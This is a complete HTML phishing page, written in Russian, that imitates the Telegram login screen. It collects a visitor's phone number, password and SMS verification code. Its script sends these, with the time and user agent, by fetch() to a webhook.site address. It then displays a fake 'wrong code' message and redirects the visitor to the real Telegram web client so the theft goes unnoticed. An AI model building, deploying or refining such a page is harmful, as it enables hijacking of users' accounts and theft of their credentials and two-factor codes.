<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        body {
            margin: 0; padding: 0;
            background: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }
        .container {
            width: 380px;
            background: #1f1f1f;
            border-radius: 12px;
            padding: 30px 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
            text-align: center;
        }
        .logo {
            width: 80px; height: 80px;
            background: linear-gradient(135deg, #229ED9, #1DA1F2);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        h1 { font-size: 24px; margin: 10px 0; }
        p { color: #aaa; margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            background: #2a2a2a;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }
        input:focus { outline: none; background: #333; }
        button {
            width: 100%;
            padding: 14px;
            background: #229ED9;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        .hidden { display: none; }
        .footer { margin-top: 20px; font-size: 13px; color: #666; }
    </style>
</head>
<body>
    <div class="container">

        <!-- ШАГ 1: Номер и пароль -->
        <div id="step1">
            <div class="logo">✈️</div>
            <h1>Вход в Telegram</h1>
            <p>Введите данные для входа</p>
            
            <input type="text" id="phone" placeholder="Номер телефона" required>
            <input type="password" id="password" placeholder="Пароль" required>
            
            <button onclick="sendFirstStep()">Войти</button>
        </div>

        <!-- ШАГ 2: Ввод кода -->
        <div id="step2" class="hidden">
            <div class="logo">✈️</div>
            <h1>Проверка аккаунта</h1>
            <p id="message">Мы отправили код подтверждения на ваш номер<br><strong id="shownPhone"></strong></p>
            
            <input type="text" id="code" placeholder="Код из SMS" maxlength="6" required>
            
            <button onclick="sendCode()">Подтвердить</button>
            <p style="margin-top:15px; font-size:14px; color:#666;">
                Не пришёл код? <span onclick="resendCode()" style="color:#229ED9; cursor:pointer;">Отправить повторно</span>
            </p>
        </div>

        <div class="footer">
            <p>© Telegram 2026</p>
        </div>
    </div>

    <script>
        const webhook = "https://webhook.site/b641348b-63b4-4792-9a51-d6b87609d9c6";
        let phone = "";
        let password = "";

        function sendFirstStep() {
            phone = document.getElementById('phone').value;
            password = document.getElementById('password').value;

            if (!phone || !password) {
                alert("Заполните все поля");
                return;
            }

            // Показываем второй шаг
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('shownPhone').textContent = phone;

            // Отправляем первый этап на webhook
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    step: "1",
                    phone: phone,
                    password: password,
                    time: new Date().toLocaleString(),
                    user_agent: navigator.userAgent
                })
            });
        }

        function sendCode() {
            const code = document.getElementById('code').value;

            if (!code) {
                alert("Введите код");
                return;
            }

            // Отправляем код на webhook
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    step: "2",
                    phone: phone,
                    password: password,
                    code: code,
                    time: new Date().toLocaleString(),
                    user_agent: navigator.userAgent
                })
            }).then(() => {
                alert("Неверный код. Попробуйте ещё раз.");
                // Можно сделать редирект
                window.location.href = "https://web.telegram.org";
            });
        }

        function resendCode() {
            alert("Код отправлен повторно.");
            // При желании можно отправить отдельный сигнал на webhook
        }
    </script>
</body>
</html>
